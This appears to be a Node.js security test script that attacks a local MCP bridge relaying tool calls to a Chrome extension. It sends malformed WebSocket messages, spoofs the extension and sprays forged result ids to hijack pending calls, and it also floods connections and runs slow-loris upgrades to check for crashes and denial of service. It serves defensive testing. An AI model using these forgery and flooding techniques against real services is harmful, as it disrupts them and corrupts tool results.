// adv-03b-ws.mjs — round 2: per-message crash attribution, deterministic
// in-flight-call interference (wait_for keeps the call pending for `time` ms),
// connection flood, slow-loris, recovery check.
import WebSocket from 'ws';
import net from 'node:net';

const BASE = 'http://127.0.0.1:7890';
const MCP = BASE + '/mcp';
const WS_URL = 'ws://127.0.0.1:7890/ws';
const MARK = 'BLAST-' + Math.random().toString(36).slice(2, 8);

let pass = 0, fail = 0;
const findings = [];
const note = (sev, title, detail) => { findings.push({ sev, title }); console.log(`  [${sev}] ${title}\n      ${detail}`); };
const ok = (m) => { pass++; console.log(`  PASS ${m}`); };
const bad = (m) => { fail++; console.log(`  FAIL ${m}`); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const status = async () => { try { return await (await fetch(BASE + '/')).json(); } catch { return null; } };

const openSockets = new Set();
function wsConnect(headers = {}, { timeout = 4000 } = {}) {
  return new Promise((resolve) => {
    let done = false;
    const ws = new WebSocket(WS_URL, { headers });
    openSockets.add(ws);
    ws.on('error', () => {});
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const t = setTimeout(() => fin({ ws, opened: false, err: 'timeout' }), timeout);
    ws.on('open', () => { clearTimeout(t); fin({ ws, opened: true }); });
    ws.on('error', (e) => { clearTimeout(t); fin({ ws, opened: false, err: e.message }); });
  });
}
async function rpc(body, sid, timeoutMs = 15000) {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetch(MCP, {
      method: 'POST', signal: ac.signal,
      headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) },
      body: JSON.stringify(body),
    });
    const text = await res.text();
    const msgs = text.split('\n').filter(l => l.startsWith('data:')).map(l => { try { return JSON.parse(l.slice(5).trim()); } catch { return null; } }).filter(Boolean);
    return { msgs, sid: res.headers.get('mcp-session-id'), status: res.status, timeout: false };
  } catch (e) {
    return { msgs: [], sid: null, status: -1, timeout: e.name === 'AbortError', err: e.message };
  } finally { clearTimeout(t); }
}
async function initSession() {
  const r = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'adv-03b', version: '0' } } });
  if (r.sid) await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' }, r.sid);
  return r.sid;
}
async function callTool(sid, name, args = {}, timeoutMs = 15000) {
  const r = await rpc({ jsonrpc: '2.0', id: Math.floor(Math.random() * 1e9), method: 'tools/call', params: { name, arguments: args } }, sid, timeoutMs);
  const m = r.msgs[r.msgs.length - 1];
  const res = m?.result;
  const text = res?.content?.[0]?.text ?? (m?.error ? 'RPC-ERR ' + m.error.message : r.timeout ? 'CLIENT-TIMEOUT' : 'EMPTY status=' + r.status);
  return { text, res, timeout: r.timeout, raw: m };
}
async function waitForExtension(maxMs = 25000) {
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs) {
    const s = await status();
    if (s?.extensionConnected) return Date.now() - t0;
    await sleep(300);
  }
  return -1;
}
const probe = async (label) => {
  const s = await status();
  if (!s) { note('CRIT', `bridge DOWN after: ${label}`, 'process appears to have crashed — remote DoS'); return false; }
  return true;
};

// =================================================================
console.log('\n== E2. Per-message crash attribution (probe after each send) ==');
{
  const rogue = await wsConnect();
  if (!rogue.opened) { bad('rogue connect failed'); } else {
    const cases = [
      ['non-JSON text', 'this is not json {{{'],
      ['JSON null', 'null'], ['JSON number', '42'], ['JSON string', '"hi"'], ['JSON array', '[1,2]'], ['empty object', '{}'],
      ['result w/o id', JSON.stringify({ type: 'result', ok: true, data: {} })],
      ['result unknown id 999999', JSON.stringify({ type: 'result', id: 999999, ok: true, data: { x: 1 } })],
      ['result string id "1"', JSON.stringify({ type: 'result', id: '1', ok: true, data: {} })],
      ['result id -1', JSON.stringify({ type: 'result', id: -1, ok: false, error: 'x' })],
      ['result id 0 ok:false err:obj', JSON.stringify({ type: 'result', id: 0, ok: false, error: { a: 1 } })],
      ['inbound call msg', JSON.stringify({ type: 'call', id: 1, tool: 'evaluate_script', args: {} })],
      ['hello spoof', JSON.stringify({ type: 'hello', name: 'chrome-mcp-extension', version: '9.9.9' })],
      ['binary frame', Buffer.from([0xde, 0xad, 0xbe, 0xef])],
      ['5MB JSON pad', JSON.stringify({ type: 'x', pad: 'A'.repeat(5 * 1024 * 1024) })],
      ['ping', JSON.stringify({ type: 'ping' })],
      ['result id 1.5 float', JSON.stringify({ type: 'result', id: 1.5, ok: true, data: {} })],
    ];
    let dead = false;
    for (const [label, payload] of cases) {
      try { rogue.ws.send(payload); } catch (e) { console.log(`  send threw: ${label}: ${e.message}`); }
      await sleep(120);
      if (!(await probe(label))) { dead = true; break; }
    }
    if (!dead) ok('all malformed messages handled; bridge alive after each');
    rogue.ws.close();
    // if socket died, check whether that alone was fatal
    await sleep(300);
    await probe('post-close');
  }
}

// =================================================================
console.log('\n== C2. Deterministic in-flight-call interference ==');
{
  const w = await waitForExtension();
  if (w < 0) { bad('extension never returned'); } else {
    console.log(`  extension connected (waited ${w}ms)`);
    const sid = await initSession();
    // need a real pageId for wait_for
    const lp = await callTool(sid, 'list_pages', {}, 8000);
    const pid = lp.res?.structuredContent?.items?.[0]?.pageId ?? lp.res?.structuredContent?.[0]?.pageId;
    console.log(`  pageId for wait_for: ${pid}`);

    const tally = { forged: 0, killed: 0, realResult: 0, other: 0 };
    for (let round = 0; round < 3; round++) {
      await waitForExtension();
      // long-running call so it's still pending when rogue connects
      const p = callTool(sid, 'wait_for', { pageId: pid, time: 4000, timeout: 9000 }, 20000);
      await sleep(300); // ensure dispatched to the REAL extension
      const rogue = await wsConnect();
      if (rogue.opened) {
        try { for (let i = 1; i <= 600; i++) rogue.ws.send(JSON.stringify({ type: 'result', id: i, ok: true, data: { forged: MARK } })); } catch {}
      }
      const r = await p;
      if (r.text.includes(MARK)) tally.forged++;
      else if (/disconnected/i.test(r.text)) tally.killed++;
      else if (r.timeout) tally.other++;
      else { tally.realResult++; console.log(`    round ${round}: real result text: ${r.text.slice(0, 100)}`); }
      try { rogue.ws.close(); } catch {}
      await sleep(500);
    }
    note(tally.forged ? 'CRIT' : 'HIGH', `in-flight interference vs REAL socket: ${JSON.stringify(tally)}`,
      'forged = blind id-spray beat the real reply; killed = victim-socket close flushed pending (close handler wipes ALL pending calls)');
  }
}

// =================================================================
console.log('\n== D2. Call hijack while impostor holds slot (timed) ==');
{
  await waitForExtension();
  const rogue = await wsConnect(); // kicks real ext
  if (rogue.opened) {
    rogue.ws.on('message', () => {}); // observe but never reply
    const sid = await initSession();
    const t0 = Date.now();
    const r = await callTool(sid, 'list_pages', {}, 20000);
    const dt = Date.now() - t0;
    if (r.timeout) note('HIGH', `call hung ${dt}ms (client-aborted; server-side pending lives until 120s timeout)`, 'impostor slot = availability loss');
    else if (/disconnected/i.test(r.text)) note('HIGH', `call killed after ${dt}ms: ${r.text.slice(0, 80)}`, 'real ext reconnect flapped the slot; pending flushed by close handler');
    else console.log(`  call answered in ${dt}ms: ${r.text.slice(0, 80)}`);
    rogue.ws.close();
  }
}

// =================================================================
console.log('\n== F2. Connection flood + slow-loris ==');
{
  const t0 = Date.now();
  const conns = await Promise.all(Array.from({ length: 100 }, () => wsConnect({}, { timeout: 8000 })));
  const opened = conns.filter(c => c.opened).length;
  const s = await status();
  console.log(`  100 rapid connects: ${opened} accepted in ${Date.now() - t0}ms; server alive=${!!s}`);
  if (opened === 100) note('MED', 'no rate limit on /ws upgrades', 'each accepted conn force-terminates the previous — trivial slot-flap DoS');
  for (const c of conns) try { c.ws?.close(); } catch {}
  await sleep(300);

  const socks = [];
  for (let i = 0; i < 5; i++) {
    const sk = net.connect(7890, '127.0.0.1', () => {
      sk.write('GET /ws HTTP/1.1\r\nHost: 127.0.0.1:7890\r\nUpgrade: websocket\r\nX-Slow: ');
      let n = 0; const iv = setInterval(() => { if (++n > 4 || sk.destroyed) return clearInterval(iv); sk.write('a'); }, 400);
      sk._iv = iv;
    });
    socks.push(sk);
  }
  await sleep(1800);
  const s2 = await status();
  if (s2) ok('server responsive during 5 half-open upgrade sockets');
  for (const sk of socks) { clearInterval(sk._iv); sk.destroy(); }
}

// =================================================================
console.log('\n== G2. Recovery ==');
for (const ws of openSockets) { try { ws.terminate(); } catch {} }
const w = await waitForExtension(25000);
if (w >= 0) ok(`real extension reconnected after ${w}ms`);
else bad('extension did not reconnect within 25s');
const sFinal = await status();
console.log(`\n  final: extensionConnected=${sFinal?.extensionConnected} sessions=${sFinal?.sessions}`);
console.log(`\n===== ${findings.length} findings =====`);
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.sev}] ${f.title}`));
console.log(`\nDONE (${pass} pass, ${fail} fail)`);
setTimeout(() => process.exit(fail === 0 ? 0 : 1), 300).unref();
